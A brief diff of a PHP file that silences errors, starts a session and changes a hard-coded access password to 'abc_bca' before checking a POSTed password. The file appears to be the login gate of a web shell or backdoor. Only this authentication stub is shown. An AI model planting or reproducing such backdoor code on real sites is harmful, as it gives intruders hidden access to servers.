@@ -7,7 +7,7 @@ error_reporting(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 session_start();
-$passwd = ".";
+$passwd = "abc_bca";
 if($_POST['pass']) {
   if($_POST['passwd'] == $passwd) {
     $_SESSION['masuk'] = "masuk";
